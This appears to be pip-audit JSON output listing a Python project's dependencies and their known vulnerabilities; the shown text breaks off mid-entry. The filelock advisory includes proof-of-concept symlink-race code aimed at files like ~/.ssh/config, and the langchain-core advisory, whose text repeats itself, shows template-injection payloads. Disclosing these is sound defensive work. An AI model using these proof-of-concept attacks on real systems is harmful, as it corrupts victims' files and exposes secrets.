{
  "bandit_results": {},
  "pip_audit_results": {
    "dependencies": [
      {
        "name": "aiohappyeyeballs",
        "version": "2.6.1",
        "vulns": []
      },
      {
        "name": "aiohttp",
        "version": "3.13.2",
        "vulns": []
      },
      {
        "name": "aiosignal",
        "version": "1.4.0",
        "vulns": []
      },
      {
        "name": "alembic",
        "version": "1.13.1",
        "vulns": []
      },
      {
        "name": "altair",
        "version": "5.5.0",
        "vulns": []
      },
      {
        "name": "altgraph",
        "version": "0.17.2",
        "vulns": []
      },
      {
        "name": "amqp",
        "version": "5.3.1",
        "vulns": []
      },
      {
        "name": "annotated-types",
        "version": "0.7.0",
        "vulns": []
      },
      {
        "name": "anthropic",
        "version": "0.18.1",
        "vulns": []
      },
      {
        "name": "anyio",
        "version": "4.12.0",
        "vulns": []
      },
      {
        "name": "appdirs",
        "version": "1.4.4",
        "vulns": []
      },
      {
        "name": "asgiref",
        "version": "3.11.0",
        "vulns": []
      },
      {
        "name": "astroid",
        "version": "3.0.3",
        "vulns": []
      },
      {
        "name": "asttokens",
        "version": "3.0.1",
        "vulns": []
      },
      {
        "name": "async-timeout",
        "version": "4.0.3",
        "vulns": []
      },
      {
        "name": "attrs",
        "version": "25.4.0",
        "vulns": []
      },
      {
        "name": "babel",
        "version": "2.17.0",
        "vulns": []
      },
      {
        "name": "backoff",
        "version": "2.2.1",
        "vulns": []
      },
      {
        "name": "bandit",
        "version": "1.7.5",
        "vulns": []
      },
      {
        "name": "bcrypt",
        "version": "5.0.0",
        "vulns": []
      },
      {
        "name": "beautifulsoup4",
        "version": "4.14.3",
        "vulns": []
      },
      {
        "name": "billiard",
        "version": "4.2.4",
        "vulns": []
      },
      {
        "name": "black",
        "version": "24.1.1",
        "vulns": [
          {
            "id": "PYSEC-2024-48",
            "fix_versions": [
              "24.3.0"
            ],
            "description": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\r\rExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings."
          }
        ]
      },
      {
        "name": "blinker",
        "version": "1.9.0",
        "vulns": []
      },
      {
        "name": "boolean-py",
        "version": "5.0",
        "vulns": []
      },
      {
        "name": "build",
        "version": "1.3.0",
        "vulns": []
      },
      {
        "name": "cachecontrol",
        "version": "0.14.3",
        "vulns": []
      },
      {
        "name": "cachetools",
        "version": "5.5.2",
        "vulns": []
      },
      {
        "name": "celery",
        "version": "5.3.6",
        "vulns": []
      },
      {
        "name": "certifi",
        "version": "2025.11.12",
        "vulns": []
      },
      {
        "name": "cffi",
        "version": "2.0.0",
        "vulns": []
      },
      {
        "name": "cfgv",
        "version": "3.4.0",
        "vulns": []
      },
      {
        "name": "charset-normalizer",
        "version": "3.4.4",
        "vulns": []
      },
      {
        "name": "chroma-hnswlib",
        "version": "0.7.3",
        "vulns": []
      },
      {
        "name": "chromadb",
        "version": "0.4.22",
        "vulns": []
      },
      {
        "name": "click",
        "version": "8.1.8",
        "vulns": []
      },
      {
        "name": "click-didyoumean",
        "version": "0.3.1",
        "vulns": []
      },
      {
        "name": "click-plugins",
        "version": "1.1.1.2",
        "vulns": []
      },
      {
        "name": "click-repl",
        "version": "0.3.0",
        "vulns": []
      },
      {
        "name": "colorama",
        "version": "0.4.6",
        "vulns": []
      },
      {
        "name": "coloredlogs",
        "version": "15.0.1",
        "vulns": []
      },
      {
        "name": "coverage",
        "version": "7.10.7",
        "vulns": []
      },
      {
        "name": "cryptography",
        "version": "46.0.3",
        "vulns": []
      },
      {
        "name": "cyclonedx-python-lib",
        "version": "4.2.3",
        "vulns": []
      },
      {
        "name": "decorator",
        "version": "5.2.1",
        "vulns": []
      },
      {
        "name": "defusedxml",
        "version": "0.7.1",
        "vulns": []
      },
      {
        "name": "dill",
        "version": "0.4.0",
        "vulns": []
      },
      {
        "name": "distlib",
        "version": "0.4.0",
        "vulns": []
      },
      {
        "name": "distro",
        "version": "1.9.0",
        "vulns": []
      },
      {
        "name": "docstring-parser",
        "version": "0.17.0",
        "vulns": []
      },
      {
        "name": "durationpy",
        "version": "0.10",
        "vulns": []
      },
      {
        "name": "ecdsa",
        "version": "0.19.1",
        "vulns": [
          {
            "id": "GHSA-wj6h-64fc-37mp",
            "fix_versions": [],
            "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."
          }
        ]
      },
      {
        "name": "et-xmlfile",
        "version": "2.0.0",
        "vulns": []
      },
      {
        "name": "exceptiongroup",
        "version": "1.3.1",
        "vulns": []
      },
      {
        "name": "executing",
        "version": "2.2.1",
        "vulns": []
      },
      {
        "name": "fastapi",
        "version": "0.109.0",
        "vulns": [
          {
            "id": "PYSEC-2024-38",
            "fix_versions": [
              "0.109.1"
            ],
            "description": "FastAPI is a web framework for building APIs with Python 3.8+ based on standard Python type hints. When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options. An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests. It's a ReDoS(Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This vulnerability has been patched in version 0.109.1."
          }
        ]
      },
      {
        "name": "filelock",
        "version": "3.19.1",
        "vulns": [
          {
            "id": "GHSA-w853-jp5j-5j7f",
            "fix_versions": [
              "3.20.1"
            ],
            "description": "### Impact  A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks. The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? \u2192 False T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable? T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink/junction         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  ### Step-by-Step Attack Flow  **1. Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} \u2192 {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # \u2190 VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // \u2190 Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # \u2190 Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)"
          }
        ]
      },
      {
        "name": "flake8",
        "version": "7.0.0",
        "vulns": []
      },
      {
        "name": "flatbuffers",
        "version": "25.12.19",
        "vulns": []
      },
      {
        "name": "frozendict",
        "version": "2.4.7",
        "vulns": []
      },
      {
        "name": "frozenlist",
        "version": "1.8.0",
        "vulns": []
      },
      {
        "name": "fsspec",
        "version": "2025.10.0",
        "vulns": []
      },
      {
        "name": "future",
        "version": "0.18.2",
        "vulns": [
          {
            "id": "PYSEC-2022-42991",
            "fix_versions": [
              "0.18.3"
            ],
            "description": "An issue discovered in Python Charmers Future 0.18.2 and earlier allows remote attackers to cause a denial of service via crafted Set-Cookie header from malicious web server."
          }
        ]
      },
      {
        "name": "ghp-import",
        "version": "2.1.0",
        "vulns": []
      },
      {
        "name": "gitdb",
        "version": "4.0.12",
        "vulns": []
      },
      {
        "name": "gitpython",
        "version": "3.1.45",
        "vulns": []
      },
      {
        "name": "google-auth",
        "version": "2.45.0",
        "vulns": []
      },
      {
        "name": "googleapis-common-protos",
        "version": "1.72.0",
        "vulns": []
      },
      {
        "name": "graphviz",
        "version": "0.20.1",
        "vulns": []
      },
      {
        "name": "grpcio",
        "version": "1.76.0",
        "vulns": []
      },
      {
        "name": "h11",
        "version": "0.16.0",
        "vulns": []
      },
      {
        "name": "hf-xet",
        "version": "1.2.0",
        "vulns": []
      },
      {
        "name": "hiredis",
        "version": "2.3.2",
        "vulns": []
      },
      {
        "name": "html5lib",
        "version": "1.1",
        "vulns": []
      },
      {
        "name": "httpcore",
        "version": "1.0.9",
        "vulns": []
      },
      {
        "name": "httptools",
        "version": "0.7.1",
        "vulns": []
      },
      {
        "name": "httpx",
        "version": "0.26.0",
        "vulns": []
      },
      {
        "name": "huggingface-hub",
        "version": "0.36.0",
        "vulns": []
      },
      {
        "name": "humanfriendly",
        "version": "10.0",
        "vulns": []
      },
      {
        "name": "identify",
        "version": "2.6.15",
        "vulns": []
      },
      {
        "name": "idna",
        "version": "3.11",
        "vulns": []
      },
      {
        "name": "importlib-metadata",
        "version": "6.11.0",
        "vulns": []
      },
      {
        "name": "importlib-resources",
        "version": "6.5.2",
        "vulns": []
      },
      {
        "name": "iniconfig",
        "version": "2.1.0",
        "vulns": []
      },
      {
        "name": "ipdb",
        "version": "0.13.13",
        "vulns": []
      },
      {
        "name": "ipython",
        "version": "8.18.1",
        "vulns": []
      },
      {
        "name": "isort",
        "version": "5.12.0",
        "vulns": []
      },
      {
        "name": "jedi",
        "version": "0.19.2",
        "vulns": []
      },
      {
        "name": "jinja2",
        "version": "3.1.6",
        "vulns": []
      },
      {
        "name": "jiter",
        "version": "0.12.0",
        "vulns": []
      },
      {
        "name": "joblib",
        "version": "1.5.3",
        "vulns": []
      },
      {
        "name": "jsonpatch",
        "version": "1.33",
        "vulns": []
      },
      {
        "name": "jsonpointer",
        "version": "3.0.0",
        "vulns": []
      },
      {
        "name": "jsonschema",
        "version": "4.25.1",
        "vulns": []
      },
      {
        "name": "jsonschema-specifications",
        "version": "2025.9.1",
        "vulns": []
      },
      {
        "name": "kombu",
        "version": "5.6.2",
        "vulns": []
      },
      {
        "name": "kubernetes",
        "version": "34.1.0",
        "vulns": []
      },
      {
        "name": "langchain",
        "version": "0.2.17",
        "vulns": []
      },
      {
        "name": "langchain-anthropic",
        "version": "0.1.23",
        "vulns": []
      },
      {
        "name": "langchain-core",
        "version": "0.2.43",
        "vulns": [
          {
            "id": "GHSA-6qv9-48xg-fc7f",
            "fix_versions": [
              "0.3.80",
              "1.0.7"
            ],
            "description": "## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates - **Reserve Jinja2 for trusted sources** - Only use Jinja2 templates when you fully control the template content  ## Update: Jinja2 Restrictions Reverted  The Jinja2 hardening introduced in the initial patch has been **reverted as of `langchain-core` 1.1.3**. The restriction was not addressing a direct vulnerability but was part of broader defensive hardening. In practice, it significantly limited legitimate Jinja2 usage and broke existing templates. Since Jinja2 is intended to be used only with **trusted template sources**, the original behavior has been restored. Users should continue to avoid accepting untrusted template strings when using Jinja2, but no security issue exists with trusted templates."
          },
          {
            "id": "GHSA-c67j-w6g6-q2cm",
            "fix_versions": [
              "0.3.81",
              "1.2.5"
            ],
